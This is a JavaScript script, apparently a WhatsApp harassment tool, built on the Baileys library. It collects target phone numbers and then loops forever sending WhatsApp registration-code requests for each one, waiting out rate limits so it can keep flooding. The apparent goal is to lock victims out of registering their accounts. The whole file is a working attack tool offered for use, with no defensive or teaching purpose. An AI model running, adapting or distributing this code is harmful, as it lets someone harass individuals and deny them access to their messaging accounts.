const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbersFilePath = './files/numbers.json';

const start = async () => {
  let usePreviousData = prompt(gradient('purple', 'cyan')('[+] Do you want to use previous data? (y/n): '));

  let targetNumbers;
  if (usePreviousData.toLowerCase() === 'y') {
    try {
      const previousData = fs.readFileSync(numbersFilePath, 'utf8');
      targetNumbers = JSON.parse(previousData);
    } catch (error) {
      console.error('Error reading previous data. Using new data.');
      usePreviousData = 'n'; // Fall back to using new data
    }
  }

  if (usePreviousData.toLowerCase() === 'n') {
    const numCount = prompt(gradient('purple', 'cyan')('[+] Enter the number of targets: '));
    targetNumbers = [];

    for (let i = 0; i < numCount; i++) {
      const ddi = prompt(gradient('purple', 'cyan')(`[+] Enter the target #${i + 1}'s international dialing code: `));
      const number = prompt(gradient('purple', 'cyan')(`[+] Enter the target #${i + 1}'s phone number: `));
      targetNumbers.push({ ddi, number });
    }

    fs.writeFileSync(numbersFilePath, JSON.stringify(targetNumbers, null, '\t'));
  }

  const { state, saveCreds } = await useMultiFileAuthState('.oiii');

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  });

const dropNumbers = async (numbers) => {
  while (true) {
    const requests = numbers.map(async (number) => {
      try {
        console.clear();
        console.log(gradient('red', 'blue')(`💀 UNAVAILABLE CODE BY EX21 💀 +${number.ddi}${number.number}`));

        const res = await spam.requestRegistrationCode({
          phoneNumber: `+${number.ddi}${number.number}`,
          phoneNumberCountryCode: number.ddi,
          phoneNumberNationalNumber: number.number,
          phoneNumberMobileCountryCode: 724
        });

        if (res.reason === 'temporarily_unavailable') {
          await new Promise(resolve => setTimeout(resolve, res.retry_after * 1000));
        }
      } catch (error) {
        // Handle errors if needed
      }
    });

    await Promise.all(requests);
  }
};

  console.clear();
  console.log(gradient('black', 'black')('■'));
  console.log(gradient('black', 'black')('■'));
  console.log(gradient('black', 'black')('■'));

  dropNumbers(targetNumbers);
};

start();
